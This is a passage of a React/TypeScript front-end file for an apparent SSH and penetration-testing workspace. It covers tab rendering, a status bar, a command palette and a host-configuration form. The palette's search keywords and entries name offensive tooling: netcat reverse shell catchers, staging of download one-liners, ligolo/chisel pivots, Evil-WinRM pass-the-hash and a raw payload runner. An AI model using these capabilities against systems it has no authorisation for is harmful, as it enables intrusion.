                          setApiTesterDraft({
                            id: `req-ws-${Date.now()}`,
                            engagementId: activeEngagement?.id || undefined,
                            collectionName: 'Default Collection',
                            name: draft.name,
                            method: 'GET',
                            url: 'ws://127.0.0.1:8080/ws',
                            params: [],
                            headers: [],
                            auth: { type: 'none' },
                            bodyType: 'hex',
                            body: draft.body,
                            rawMode: false,
                            rawRequest: '',
                            routeId: '',
                            timeoutSec: 20,
                            followRedirects: true,
                            useCookieJar: true,
                            tlsSkipVerify: false,
                          });
                          openApiTesterTab();
                        }}
                        onSaveToEvidence={async (title, category, content) => {
                          await handleSaveSelectionEvidence({
                            id: `ev-hex-${Date.now()}`,
                            engagementId: activeEngagement?.id || '',
                            category,
                            title,
                            type: 'text',
                            content,
                            source: 'hex-runner',
                            inReport: true,
                            severity: 'info',
                            capturedAt: new Date().toISOString(),
                          });
                        }}
                        onClose={() => void handleCloseTab(tab.id)}
                      />
                    ) : tab.tabType === 'network-map' ? (
                      <NetworkMapView
                        hosts={vaultSummary.hosts}
                        groups={vaultSummary.groups}
                        notes={notes}
                        proxyProfiles={vaultSummary.proxyProfiles}
                        activeSessionHostIds={getActiveSessionHostIds()}
                        activeTunnels={activeTunnels}
                        forwardRules={forwardRules}
                        onConnectHost={(hostId) => {
                          const h = vaultSummary.hosts.find((x) => x.id === hostId);
                          if (h) void handleConnectSavedHost(h);
                        }}
                        onSplitConnectHost={(hostId) => {
                          const h = vaultSummary.hosts.find((x) => x.id === hostId);
                          if (h) void handleConnectHostIntoSplit(h, 'right');
                        }}
                        onOpenSftp={(hostId) => {
                          const h = vaultSummary.hosts.find((x) => x.id === hostId);
                          if (h) void handleOpenHostSftp(h);
                        }}
                        onOpenNotes={(hostId) => openNotesTab(hostId)}
                        onStartTunnel={handleStartTunnelWithHost}
                        onStopTunnel={handleStopForwardTunnel}
                        onOpenForwardingManager={(hostId) => {
                          setForwardingModalHostId(hostId);
                          setShowPortForwardingModal(true);
                        }}
                        onClose={() => void handleCloseTab(tab.id)}
                        isDocked={false}
                      />
                    ) : tab.tabType === 'editor' && tab.editSessionId ? (
                      <RemoteEditorView
                        editSession={{
                          id: tab.editSessionId,
                          sessionId: tab.rootNode.type === 'pane' ? tab.rootNode.sessionId : '',
                          remotePath: tab.editRemotePath || '',
                          localPath: '',
                          filename: tab.title.replace('Edit: ', ''),
                          initialModTime: 0,
                          initialSize: 0,
                          initialHash: '',
                          status: 'active',
                          lastUploadedAt: 0,
                          hasConflict: false,
                        }}
                        api={{
                          GetRemoteEditContent: (eid) =>
                            getWailsBindings()?.GetRemoteEditContent?.(eid) ?? Promise.resolve(''),
                          SaveRemoteEditContent: (eid, content, force) =>
                            getWailsBindings()?.SaveRemoteEditContent?.(eid, content, force) ??
                            Promise.resolve({ success: true, conflict: false, remoteModTime: 0, remoteSize: 0, message: '' }),
                          CheckRemoteConflict: (eid) =>
                            getWailsBindings()?.CheckRemoteConflict?.(eid) ??
                            Promise.resolve({ hasConflict: false, remotePath: '', initialModTime: 0, remoteModTime: 0, initialSize: 0, remoteSize: 0, message: '' }),
                          OpenExternalEditor: (eid) =>
                            getWailsBindings()?.OpenExternalEditor?.(eid) ?? Promise.resolve(),
                          CloseRemoteEdit: (eid) =>
                            getWailsBindings()?.CloseRemoteEdit?.(eid) ?? Promise.resolve(),
                        }}
                        eventsOn={getWailsRuntime()?.EventsOn}
                        onClose={() => void handleCloseTab(tab.id)}
                        isSplitPane={false}
                      />
                    ) : (
                      <div
                        className={`terminal-bg-wrap${
                          !globalSettings.lowLatencyMode &&
                          globalSettings.terminalBg &&
                          globalSettings.terminalBg !== 'none'
                            ? ' has-bg'
                            : ''
                        }`}
                        style={
                          {
                            '--term-surface': `color-mix(in srgb, var(--bg-base) ${Math.round(
                              (globalSettings.terminalBgOpacity ?? 0.75) * 100
                            )}%, transparent)`,
                          } as React.CSSProperties
                        }
                      >
                        {!globalSettings.lowLatencyMode && (
                          <TerminalBackground
                            treatment={globalSettings.terminalBg ?? 'none'}
                            animate={globalSettings.terminalBgAnimate ?? true}
                            colorTheme={globalSettings.colorTheme}
                          />
                        )}
                        <div className="terminal-bg-content">
                          {renderWorkspaceNode(tab.rootNode, tab, tabPanes.length)}
                        </div>
                      </div>
                    )}
                  </div>
                );
              })}
              {openNotesDrawerHostId && (
                <HostNotesDrawer
                  isOpen={Boolean(openNotesDrawerHostId)}
                  hostId={openNotesDrawerHostId}
                  notes={notes}
                  hosts={vaultSummary.hosts.map((h) => ({
                    id: h.id,
                    label: h.label,
                    address: h.address,
                  }))}
                  onSaveNote={handleSaveNote}
                  onDeleteNote={handleDeleteNote}
                  onClose={() => setOpenNotesDrawerHostId(null)}
                  onPinSplit={() => handlePinNotesSplit(openNotesDrawerHostId)}
                  onOpenFullNotes={() => {
                    const hostIdToOpen = openNotesDrawerHostId;
                    setOpenNotesDrawerHostId(null);
                    openNotesTab(hostIdToOpen || undefined);
                  }}
                  onHeaderDragStart={() =>
                    startWorkspaceDrag({
                      type: 'tool',
                      toolType: 'notes',
                      hostId: openNotesDrawerHostId,
                      title: 'Host Notes',
                    })
                  }
                  onHeaderDragEnd={() => startWorkspaceDrag(null)}
                />
              )}
            </div>
          </section>
        ) : (
          <section className="empty-state" aria-label="Terminal Workspace Quick Start">
            {renderNewConnectionLauncher()}
          </section>
        )}
      </div>

      {/* Sci-Fi HUD Bottom Telemetry Bar */}
      <footer className="cyber-hud-statusbar" aria-label="System Telemetry Footer">
        <div className="hud-status-left">
          <button
            type="button"
            className={`hud-status-pill ${vaultLocked ? 'locked' : 'unlocked'}`}
            onClick={() => {
              if (vaultLocked) {
                handleOpenVaultButton();
              } else {
                void handleVaultLock();
              }
            }}
            style={{ cursor: 'pointer', background: 'none' }}
            title={
              vaultLocked
                ? 'Vault is Locked — Click to Unlock or Set Up Vault'
                : 'Vault is Unlocked — Click to Lock Vault'
            }
            aria-label={vaultLocked ? 'Unlock Vault' : 'Lock Vault'}
          >
            <CyberIcon name={vaultLocked ? 'lock' : 'unlock'} size={11} />
            <span>
              {vaultLocked
                ? 'Vault Locked'
                : passwordless
                  ? 'Vault Unlocked (No PW)'
                  : 'Vault Unlocked'}
            </span>
          </button>
          {activePane ? (
            <span className="hud-status-segment">
              <span className="hud-status-key">TARGET:</span>
              <strong className="hud-status-val">{activePane.title}</strong>
            </span>
          ) : (
            <span className="hud-status-segment">
              <span className="hud-status-key">MODE:</span>
              <span className="hud-status-val">STANDBY</span>
            </span>
          )}
          {activeTabPanes.length > 1 && (
            <span className="hud-status-segment">
              <span className="hud-status-key">GRID:</span>
              <span className="hud-status-val">{activeTabPanes.length} PANES</span>
            </span>
          )}
          {broadcastState.enabled && (
            <div
              className="hud-status-pill danger broadcast-bottom-pill"
              role="status"
              aria-label="Broadcast Input Mode Active"
              title="Broadcast Input ACTIVE: keystrokes will be sent to all participating terminals."
            >
              <span className="broadcast-pulse-dot" />
              <CyberIcon name="broadcast" size={11} />
              <span>BROADCAST ({getBroadcastTargetSessionIds().length} sessions)</span>
              <button
                type="button"
                className="broadcast-disarm-btn"
                onClick={() => handleToggleBroadcast()}
                title="Disarm Broadcast Mode (Esc / Alt+B)"
                aria-label="Disarm Broadcast Mode"
              >
                <CyberIcon name="close" size={10} />
                <span>Disarm</span>
              </button>
            </div>
          )}
          {activeLogSessions.size > 0 && (
            <span className="hud-status-pill rec">
              <CyberIcon name="record" size={10} />
              <span>REC ({activeLogSessions.size})</span>
            </span>
          )}
          {activeTunnels.length > 0 && (
            <span className="hud-status-pill ok">
              <CyberIcon name="tunnel" size={11} />
              <span>TUNNELS ({activeTunnels.length})</span>
            </span>
          )}
        </div>
        <div className="hud-status-right">
          <span className="hud-status-msg-inline">{statusMessage}</span>
          <span className="hud-status-shortcut">Ctrl+K Palette</span>
        </div>
      </footer>

      {showCommandPalette && (
        <div
          className="modal-backdrop cyber-modal-overlay"
          role="dialog"
          aria-label="Command Palette"
          onClick={(e) => {
            if (e.target === e.currentTarget) {
              setShowCommandPalette(false);
            }
          }}
        >
          <div className="cyber-dialog-card palette-card" style={{ maxWidth: '680px', width: '94vw', maxHeight: '88vh', overflow: 'hidden', display: 'flex', flexDirection: 'column', position: 'relative' }}>
            {/* Reticles */}
            <div className="cyber-corner-reticle cyber-corner-tl" />
            <div className="cyber-corner-reticle cyber-corner-tr" />
            <div className="cyber-corner-reticle cyber-corner-bl" />
            <div className="cyber-corner-reticle cyber-corner-br" />

            {/* Header */}
            <div className="dialog-header" style={{ flexShrink: 0 }}>
              <div className="dialog-title">
                <span className="cyber-hazard-stripes">///</span>
                <div>
                  <h3 style={{ margin: 0, fontSize: '0.98rem', color: 'var(--accent-bright)', letterSpacing: '0.06em' }}>
                    <CyberIcon name="bolt" size={14} /> Command Palette &amp; Quick Connect
                  </h3>
                  <div style={{ fontSize: '0.7rem', color: 'var(--accent-bright)', fontFamily: 'JetBrains Mono, Consolas, monospace', marginTop: '2px', letterSpacing: '0.04em' }}>
                    FUZZY-ROUTER // HOSTS · NOTES · SCRIPTS · NETCAT · RAW TCP
                  </div>
                </div>
              </div>
              <button
                type="button"
                className="cyber-btn-close"
                onClick={() => setShowCommandPalette(false)}
                aria-label="Close dialog"
              >
                ×
              </button>
            </div>
            <div className="dialog-body" style={{ flex: 1, minHeight: 0, overflowY: 'auto', padding: '1.25rem', display: 'flex', flexDirection: 'column', gap: '0.75rem' }}>
              <p>
                Fuzzy search saved hosts by <strong>Name</strong>, <strong>Address</strong>, or{' '}
                <strong>Tags</strong>, or type <code>user@host:port</code> to connect directly.
              </p>
              <input
                aria-label="Command Palette Input"
                className="cyber-hud-input"
                placeholder="Search hosts, tags, or type user@host:port..."
                value={paletteQuery}
                onChange={(e) => setPaletteQuery(e.target.value)}
                onKeyDown={(e) => {
                  if (e.key === 'Enter') {
                    e.preventDefault();
                    if (paletteResponse.quickConnect) {
                      void handleQuickConnectFromPalette(paletteResponse.quickConnect);
                    } else if (paletteResponse.hostResults.length > 0) {
                      const topHost = paletteResponse.hostResults[0].host;
                      setShowCommandPalette(false);
                      setPaletteQuery('');
                      void handleConnectSavedHost(topHost);
                    }
                  }
                }}
                autoFocus
              />

              {paletteResponse.quickConnect && (
                <div className="quick-unlock-box">
                  <div className="palette-item-main">
                    <strong>Quick Connect: {paletteResponse.quickConnect.display}</strong>
                    <span>Direct SSH connection (Enter or click Connect)</span>
                  </div>
                  <input
                    aria-label="Quick Connect Password"
                    type="password"
                    placeholder="Password (optional)"
                    value={palettePassword}
                    onChange={(e) => setPalettePassword(e.target.value)}
                  />
                  <button
                    type="button"
                    className="btn-primary btn-sm"
                    onClick={() => {
                      if (paletteResponse.quickConnect) {
                        void handleQuickConnectFromPalette(paletteResponse.quickConnect);
                      }
                    }}
                  >
                    Quick Connect {paletteResponse.quickConnect.display}
                  </button>
                </div>
              )}

              <div className="palette-results" aria-label="Command Palette Results">
                {vaultLocked ? (
                  <div className="info-banner">
                    Vault is currently locked. Unlock the vault to search saved hosts, or type{' '}
                    <code>user@host:port</code> above for direct Quick Connect.
                  </div>
                ) : paletteResponse.hostResults.length === 0 ? (
                  <p>No saved hosts match &ldquo;{paletteQuery}&rdquo;.</p>
                ) : (
                  paletteResponse.hostResults.map((item) => (
                    <button
                      key={item.host.id}
                      type="button"
                      className="palette-item"
                      onClick={() => {
                        setShowCommandPalette(false);
                        setPaletteQuery('');
                        void handleConnectSavedHost(item.host);
                      }}
                    >
                      <div className="palette-item-main">
                        <strong>{item.host.label}</strong>
                        <span>
                          {item.host.effectiveUser}@{item.host.address}:{item.host.effectivePort}
                        </span>
                      </div>
                      <div className="palette-tags">
                        {item.host.tags.map((tag) => (
                          <span key={tag} className="tag-pill">
                            #{tag}
                          </span>
                        ))}
                        <span className="kbd-badge">Connect <CyberIcon name="return" size={14} /></span>
                      </div>
                    </button>
                  ))
                )}

                {!vaultLocked &&
                  paletteQuery.trim().length > 0 &&
                  (() => {
                    const q = paletteQuery.trim().toLowerCase();
                    const matchedNotes = notes.filter(
                      (n) =>
                        n.title.toLowerCase().includes(q) || n.body.toLowerCase().includes(q)
                    );
                    if (matchedNotes.length === 0) return null;
                    return (
                      <div
                        style={{
                          marginTop: '0.75rem',
                          paddingTop: '0.5rem',
                          borderTop: '1px solid var(--border-color)',
                        }}
                      >
                        <div
                          style={{
                            fontSize: '0.72rem',
                            fontWeight: 700,
                            textTransform: 'uppercase',
                            color: 'var(--text-muted)',
                            marginBottom: '0.4rem',
                          }}
                        >
                          <CyberIcon name="note" size={14} /> Notes &amp; Documentation
                        </div>
                        {matchedNotes.map((n) => {
                          const hostObj = vaultSummary.hosts.find((h) => h.id === n.hostId);
                          return (
                            <button
                              key={n.id}
                              type="button"
                              className="palette-item"
                              onClick={() => {
                                setShowCommandPalette(false);
                                setPaletteQuery('');
                                setNotesModalHostId(n.hostId || undefined);
                                setNotesModalInitialNoteId(n.id);
                                setShowNotesModal(true);
                              }}
                            >
                              <div className="palette-item-main">
                                <strong>
                                  {n.isFolder ? <CyberIcon name="folder" size={14} /> : <CyberIcon name="file" size={14} />}
                                  {n.title}
                                </strong>
                                <span>
                                  {hostObj
                                    ? `Host: ${hostObj.label} (${hostObj.address})`
                                    : 'Global Note'}
                                </span>
                              </div>
                              <div className="palette-tags">
                                <span className="kbd-badge">Open Note <CyberIcon name="return" size={14} /></span>
                              </div>
                            </button>
                          );
                        })}
                      </div>
                    );
                  })()}

                {(() => {
                  const q = paletteQuery.trim().toLowerCase();
                  const showNetMap =
                    !q ||
                    'network topology map'.includes(q) ||
                    'map'.includes(q) ||
                    'topology'.includes(q) ||
                    'netzwerkkarte'.includes(q);
                  if (!showNetMap) return null;
                  return (
                    <button
                      type="button"
                      className="palette-item"
                      onClick={() => {
                        setShowCommandPalette(false);
                        setPaletteQuery('');
                        openNetworkMapTab();
                      }}
                    >
                      <div className="palette-item-main">
                        <strong><CyberIcon name="globe" size={14} /> Network Topology Map</strong>
                        <span>Interactive network graph &amp; jump chain visualizer</span>
                      </div>
                      <div className="palette-tags">
                        <span className="kbd-badge">Open Map <CyberIcon name="return" size={14} /></span>
                      </div>
                    </button>
                  );
                })()}

                {(() => {
                  const q = paletteQuery.toLowerCase().trim();
                  const showRaw =
                    !q ||
                    'raw'.includes(q) ||
                    'tcp'.includes(q) ||
                    'nc'.includes(q) ||
                    'netcat'.includes(q) ||
                    'listen'.includes(q) ||
                    'reverse'.includes(q) ||
                    'shell'.includes(q);
                  if (!showRaw) return null;
                  return (
                    <button
                      type="button"
                      className="palette-item"
                      onClick={() => {
                        setShowCommandPalette(false);
                        setPaletteQuery('');
                        setShowRawTcpModal(true);
                      }}
                    >
                      <div className="palette-item-main">
                        <strong><CyberIcon name="bolt" size={14} /> Raw TCP Socket &amp; Listener</strong>
                        <span>Direct Netcat outgoing client or inbound reverse shell catcher</span>
                      </div>
                      <div className="palette-tags">
                        <span className="kbd-badge">Raw TCP <CyberIcon name="return" size={14} /></span>
                      </div>
                    </button>
                  );
                })()}

                {(() => {
                  const q = paletteQuery.toLowerCase().trim();
                  const showTransfer =
                    !q ||
                    'file transfer helper'.includes(q) ||
                    'transfer'.includes(q) ||
                    'http'.includes(q) ||
                    'serve'.includes(q) ||
                    'upload'.includes(q) ||
                    'download'.includes(q) ||
                    'curl'.includes(q) ||
                    'wget'.includes(q) ||
                    'certutil'.includes(q) ||
                    'updog'.includes(q) ||
                    'hash'.includes(q);
                  if (!showTransfer) return null;
                  return (
                    <button
                      type="button"
                      className="palette-item"
                      onClick={() => {
                        setShowCommandPalette(false);
                        setPaletteQuery('');
                        setShowFileTransferModal(true);
                      }}
                    >
                      <div className="palette-item-main">
                        <strong style={{ display: 'inline-flex', alignItems: 'center', gap: '0.45rem' }}>
                          <CyberIcon name="upload" size={14} />
                          <span>File Transfer Helper // HTTP Staging</span>
                        </strong>
                        <span>HTTP/SMB staging server, target download one-liners &amp; SHA-256/MD5 verifier</span>
                      </div>
                      <div className="palette-tags">
                        <span className="kbd-badge">Open Staging <CyberIcon name="return" size={14} /></span>
                      </div>
                    </button>
                  );
                })()}

                {(() => {
                  const q = paletteQuery.toLowerCase().trim();
                  const showPivot =
                    !q ||
                    'pivoting engine'.includes(q) ||
                    'ligolo'.includes(q) ||
                    'chisel'.includes(q) ||
                    'tunnel'.includes(q) ||
                    'socks'.includes(q) ||
                    'route'.includes(q);
                  if (!showPivot) return null;
                  return (
                    <button
                      type="button"
                      className="palette-item"
                      onClick={() => {
                        setShowCommandPalette(false);
                        setPaletteQuery('');
                        setShowPivotManagerModal(true);
                      }}
                    >
                      <div className="palette-item-main">
                        <strong style={{ display: 'inline-flex', alignItems: 'center', gap: '0.45rem' }}>
                          <CyberIcon name="pivot-hop" size={14} />
                          <span>Pivoting Engine // ligolo-ng &amp; chisel</span>
                        </strong>
                        <span>Start/stop ligolo-ng TUN or chisel reverse SOCKS5 pivots, routes &amp; agent one-liners</span>
                      </div>
                      <div className="palette-tags">
                        <span className="kbd-badge">Open Pivot <CyberIcon name="return" size={14} /></span>
                      </div>
                    </button>
                  );
                })()}
                {(() => {
                  const q = paletteQuery.toLowerCase();
                  const showHealth =
                    !q ||
                    'health'.includes(q) ||
                    'route'.includes(q) ||
                    'probe'.includes(q) ||
                    'opsec'.includes(q) ||
                    'socks'.includes(q);
                  if (!showHealth) return null;
                  return (
                    <button
                      type="button"
                      className="palette-item"
                      onClick={() => {
                        setShowCommandPalette(false);
                        setPaletteQuery('');
                        openRouteHealthTab();
                      }}
                    >
                      <div className="palette-item-main">
                        <strong style={{ display: 'inline-flex', alignItems: 'center', gap: '0.45rem' }}>
                          <CyberIcon name="shield" size={14} />
                          <span>Route Health Check Dashboard</span>
                        </strong>
                        <span>On-demand throttled TCP connect probes, SOCKS5 checks &amp; ligolo session status</span>
                      </div>
                      <div className="palette-tags">
                        <span className="kbd-badge">Check Health <CyberIcon name="return" size={14} /></span>
                      </div>
                    </button>
                  );
                })()}
                {(() => {
                  const q = paletteQuery.toLowerCase();
                  const showRemoteSockets =
                    !q ||
                    'remote sockets'.includes(q) ||
                    'listening'.includes(q) ||
                    'tunnel'.includes(q) ||
                    'forward'.includes(q) ||
                    'ss'.includes(q) ||
                    'netstat'.includes(q);
                  if (!showRemoteSockets) return null;
                  return (
                    <button
                      type="button"
                      className="palette-item"
                      onClick={() => {
                        setShowCommandPalette(false);
                        setPaletteQuery('');
                        setShowRemoteSocketsModal(true);
                      }}
                    >
                      <div className="palette-item-main">
                        <strong style={{ display: 'inline-flex', alignItems: 'center', gap: '0.45rem' }}>
                          <CyberIcon name="tunnel" size={14} />
                          <span>Remote Listening Sockets &amp; 1-Click -L Forward</span>
                        </strong>
                        <span>On-demand non-PTY SSH socket discovery (Linux &amp; Windows) with 1-click -L tunnel &amp; API probe</span>
                      </div>
                      <div className="palette-tags">
                        <span className="kbd-badge">Open Sockets <CyberIcon name="return" size={14} /></span>
                      </div>
                    </button>
                  );
                })()}

                {(() => {
                  const q = paletteQuery.toLowerCase();
                  const showApiTester =
                    !q ||
                    'api tester'.includes(q) ||
                    'http repeater'.includes(q) ||
                    'postman'.includes(q) ||
                    'burp'.includes(q) ||
                    'caido'.includes(q) ||
                    'ai chat'.includes(q);
                  if (!showApiTester) return null;
                  return (
                    <button
                      type="button"
                      className="palette-item"
                      onClick={() => {
                        setShowCommandPalette(false);
                        setPaletteQuery('');
                        openApiTesterTab();
                      }}
                    >
                      <div className="palette-item-main">
                        <strong style={{ display: 'inline-flex', alignItems: 'center', gap: '0.45rem' }}>
                          <CyberIcon name="globe" size={14} />
                          <span>API Tester &amp; HTTP Repeater</span>
                        </strong>
                        <span>HTTP/Raw Repeater, SOCKS5 pivots, Vault secrets, Param Replay, Diff &amp; AI Chat Mode</span>
                      </div>
                      <div className="palette-tags">
                        <span className="kbd-badge">Open View <CyberIcon name="return" size={14} /></span>
                      </div>
                    </button>
                  );
                })()}
                {(() => {
                  const q = paletteQuery.toLowerCase().trim();
                  const showHexRunner =
                    !q ||
                    'hex runner'.includes(q) ||
                    'binary'.includes(q) ||
                    'payload'.includes(q) ||
                    'cyclic'.includes(q) ||
                    'nopty'.includes(q) ||
                    'raw'.includes(q);
                  if (!showHexRunner) return null;
                  return (
                    <button
                      type="button"
                      className="palette-item"
                      onClick={() => {
                        setShowCommandPalette(false);
                        setPaletteQuery('');
                        openHexRunnerTab();
                      }}
                    >
                      <div className="palette-item-main">
                        <strong style={{ display: 'inline-flex', alignItems: 'center', gap: '0.45rem' }}>
                          <CyberIcon name="bolt" size={14} />
                          <span>Binary / Hex Payload Runner (No-PTY)</span>
                        </strong>
                        <span>Send exact raw bytes (0x00–0xFF), cyclic patterns &amp; delays to binaries, Raw TCP, or HTTP API</span>
                      </div>
                      <div className="palette-tags">
                        <span className="kbd-badge">Open View <CyberIcon name="return" size={14} /></span>
                      </div>
                    </button>
                  );
                })()}

                {(() => {
                  const q = paletteQuery.toLowerCase();
                  const showWinrm =
                    !q ||
                    'winrm'.includes(q) ||
                    'powershell'.includes(q) ||
                    'evil-winrm'.includes(q) ||
                    'remoting'.includes(q) ||
                    'ntlm'.includes(q) ||
                    'pth'.includes(q);
                  if (!showWinrm) return null;
                  return (
                    <button
                      type="button"
                      className="palette-item"
                      onClick={() => {
                        setShowCommandPalette(false);
                        setPaletteQuery('');
                        openWinrmTab();
                      }}
                    >
                      <div className="palette-item-main">
                        <strong style={{ display: 'inline-flex', alignItems: 'center', gap: '0.45rem' }}>
                          <CyberIcon name="terminal" size={14} />
                          <span>WinRM // PowerShell Remoting Client</span>
                        </strong>
                        <span>HTTP 5985 / HTTPS 5986 interactive Evil-WinRM parity shell, PtH &amp; file transfer</span>
                      </div>
                      <div className="palette-tags">
                        <span className="kbd-badge">Open WinRM <CyberIcon name="return" size={14} /></span>
                      </div>
                    </button>
                  );
                })()}

                {(() => {
                  const cleanQ = paletteQuery.trim();
                  const isNc = cleanQ.startsWith('nc ') || cleanQ.startsWith('tcp://');
                  if (!isNc) return null;
                  let targetHost = '';
                  let targetPort = 8080;
                  if (cleanQ.startsWith('nc ')) {
                    const parts = cleanQ.slice(3).trim().split(/\s+/);
                    targetHost = parts[0] || '';
                    if (parts[1]) targetPort = parseInt(parts[1], 10) || 8080;
                  } else if (cleanQ.startsWith('tcp://')) {
                    const noProto = cleanQ.slice(6);
                    const parts = noProto.split(':');
                    targetHost = parts[0] || '';
                    if (parts[1]) targetPort = parseInt(parts[1], 10) || 8080;
                  }
                  if (!targetHost) return null;
                  return (
                    <button
                      type="button"
                      className="palette-item palette-quick-connect"
                      onClick={() => {
                        setShowCommandPalette(false);
                        setPaletteQuery('');
                        void handleConnectRawTcp({
                          host: targetHost,
                          port: targetPort,
                          lineMode: true,
                          lineEnding: 'crlf',
                        });
                      }}
                    >
                      <div className="palette-item-main">
                        <strong><CyberIcon name="play" size={14} /> Connect Raw TCP to {targetHost}:{targetPort}</strong>
                        <span>Direct raw socket connection</span>
                      </div>
                      <div className="palette-tags">
                        <span className="kbd-badge">Connect <CyberIcon name="return" size={14} /></span>
                      </div>
                    </button>
                  );
                })()}

                {(() => {
                  const cleanQ = paletteQuery.trim();
                  if (!cleanQ.startsWith('listen ')) return null;
                  const portStr = cleanQ.slice(7).trim();
                  const port = parseInt(portStr, 10);
                  if (!port || port <= 0 || port > 65535) return null;
                  return (
                    <button
                      type="button"
                      className="palette-item palette-quick-connect"
                      onClick={() => {
                        setShowCommandPalette(false);
                        setPaletteQuery('');
                        void handleStartRawTcpListener({
                          port,
                          bindAddress: '0.0.0.0',
                          autoSpawnTab: true,
                        });
                      }}
                    >
                      <div className="palette-item-main">
                        <strong><CyberIcon name="bolt" size={14} /> Start Listener on :{port}</strong>
                        <span>Inbound raw socket listener / reverse shell catcher</span>
                      </div>
                      <div className="palette-tags">
                        <span className="kbd-badge">Listen <CyberIcon name="return" size={14} /></span>
                      </div>
                    </button>
                  );
                })()}
              </div>

              <div style={{ display: 'flex', justifyContent: 'flex-end', marginTop: '0.5rem' }}>
                <button
                  type="button"
                  className="cyber-btn cyber-btn-secondary"
                  onClick={() => setShowCommandPalette(false)}
                >
                  Close (Esc)
                </button>
              </div>
            </div>
          </div>
        </div>
      )}

      {showAddHostModal && (
        <div
          className="modal-backdrop cyber-modal-overlay"
          role="dialog"
          aria-label={editingHostId ? 'Edit Host' : 'New Host'}
          onClick={(e) => {
            if (e.target === e.currentTarget) {
              setShowAddHostModal(false);
              setEditingHostId(null);
              setEditingIdentityId('');
              setShowHostPass(false);
            }
          }}
        >
          <div
            className="cyber-dialog-card host-modal-card"
            style={{ maxWidth: '640px', width: '94vw', maxHeight: '90vh', overflow: 'hidden', display: 'flex', flexDirection: 'column', position: 'relative' }}
          >
            {/* Reticles */}
            <div className="cyber-corner-reticle cyber-corner-tl" />
            <div className="cyber-corner-reticle cyber-corner-tr" />
            <div className="cyber-corner-reticle cyber-corner-bl" />
            <div className="cyber-corner-reticle cyber-corner-br" />

            {/* Header */}
            <div className="dialog-header" style={{ flexShrink: 0 }}>
              <div className="dialog-title">
                <span className="cyber-hazard-stripes">///</span>
                <div>
                  <h3 style={{ margin: 0, fontSize: '0.98rem', color: 'var(--accent-bright)', letterSpacing: '0.06em' }}>
                    {editingHostId ? <><CyberIcon name="gear" size={14} /> Edit SSH Host</> : <><CyberIcon name="plus" size={14} /> New SSH Host</>}
                  </h3>
                  <div style={{ fontSize: '0.7rem', color: 'var(--accent-bright)', fontFamily: 'JetBrains Mono, Consolas, monospace', marginTop: '2px', letterSpacing: '0.04em' }}>
                    VAULT-TARGET // SECURE HOST CONFIGURATION
                  </div>
                </div>
              </div>
              <button
                type="button"
                className="cyber-btn-close"
                onClick={() => {
                  setShowAddHostModal(false);
                  setEditingHostId(null);
                  setEditingIdentityId('');
                  setShowHostPass(false);
                }}
                aria-label="Close dialog"
              >
                ×
              </button>
            </div>

            <form
              id="host-modal-form"
              onSubmit={(e) => void handleSaveHost(e)}
              className="dialog-body"
              style={{ flex: 1, minHeight: 0, overflowY: 'auto', padding: '1.25rem', display: 'flex', flexDirection: 'column', gap: '0.85rem' }}
            >
              <div>
                <label className="cyber-label">Host Label</label>
                <input
                  aria-label="Host Label"
                  placeholder="Label (e.g. Bastion EU)"
                  value={hostLabel}
                  onChange={(e) => setHostLabel(e.target.value)}
                  className="cyber-hud-input"
                  required
                  autoFocus
                />
              </div>

              <div>
                <label className="cyber-label">Host IP or Hostname</label>
                <input
                  aria-label="Host IP or Hostname"
                  placeholder="Address / IP (e.g. 10.10.1.50)"
                  value={hostAddr}
                  onChange={(e) => setHostAddr(e.target.value)}
                  className="cyber-hud-input"
                  required
                />
              </div>

              <div>
                <label className="cyber-label">Pentest Engagement Scope</label>
                <select
                  aria-label="Host Engagement"
                  value={hostEngagementId}
                  onChange={(e) => setHostEngagementId(e.target.value)}
                  className="cyber-hud-select"
                  style={{ width: '100%' }}
                >
                  <option value=""><CyberIcon name="globe" size={14} /> No Engagement (Casual / Global Host)</option>
                  {engagementsList.map((eng) => (
                    <option key={eng.id} value={eng.id}>
                      <CyberIcon name="target" size={14} /> {eng.name}
                    </option>
                  ))}
                </select>
              </div>

              <div style={{ display: 'grid', gridTemplateColumns: '1fr 2fr', gap: '0.65rem' }}>
                <div>
                  <label className="cyber-label">Port</label>
                  <input
                    aria-label="Host Port"
                    placeholder="22"
                    value={hostPort}
                    onChange={(e) => setHostPort(e.target.value)}
                    className="cyber-hud-input"
                  />
                </div>
                <div>
                  <label className="cyber-label">Username</label>
                  <input
                    aria-label="Host Username"
                    placeholder="Username (e.g. root, ubuntu, admin)"
                    value={hostUser}
                    onChange={(e) => setHostUser(e.target.value)}
                    className="cyber-hud-input"
                  />
                </div>
              </div>

              <div>
                <label className="cyber-label">Authentication Method</label>
                <select
                  aria-label="Host Auth Method"
                  value={hostAuthMethod}
                  onChange={(e) => setHostAuthMethod(e.target.value)}
                  className="cyber-hud-select"
                >
                  <option value="password">Password (Vault Encrypted)</option>
                  <option value="key">SSH Key from Keychain</option>
                  <option value="agent">Windows OpenSSH Agent / Pageant</option>
                </select>
              </div>

              {hostAuthMethod === 'password' && (
                <div>
                  <label className="cyber-label">Host Password</label>
                  <div style={{ display: 'flex', gap: '6px', alignItems: 'center' }}>
                    <input
                      aria-label="Host Password"
                      type={showHostPass ? 'text' : 'password'}
                      placeholder="Password (stored encrypted in Vault)"
                      value={hostPass}
                      onChange={(e) => setHostPass(e.target.value)}
                      className="cyber-hud-input"
                      style={{ flex: 1 }}
                    />
                    <button
                      type="button"
                      className="cyber-btn cyber-btn-secondary"
                      onClick={() => setShowHostPass((prev) => !prev)}
                      title={showHostPass ? 'Hide Password' : 'Show Password'}
                      aria-label={showHostPass ? 'Hide Password' : 'Show Password'}
                      style={{ padding: '0.4rem 0.75rem', height: '34px', fontSize: '0.82rem', whiteSpace: 'nowrap' }}
                    >
                      {showHostPass ? <><CyberIcon name="eye-off" size={14} /> Hide</> : <><CyberIcon name="eye" size={14} /> Show</>}
                    </button>
                  </div>
                </div>
              )}

              {hostAuthMethod === 'key' && (
                <div>
                  <label className="cyber-label">SSH Key</label>
                  <select
                    aria-label="Host SSH Key"
                    value={hostKeyId}
                    onChange={(e) => setHostKeyId(e.target.value)}
                    className="cyber-hud-select"
                  >
                    <option value="">Select Key from Keychain...</option>
                    {(vaultSummary.keys || []).map((k) => (
                      <option key={k.id} value={k.id}>
                        {k.label} ({k.type} · {k.fingerprint})
                      </option>
                    ))}
                  </select>
                </div>
              )}

              <div>
                <label className="cyber-label">Labels &amp; Tags</label>
                <input
                  aria-label="Host Tags"
                  placeholder="Tags (comma-separated, e.g. prod, linux, dmz)"
                  value={hostTags}
                  onChange={(e) => setHostTags(e.target.value)}
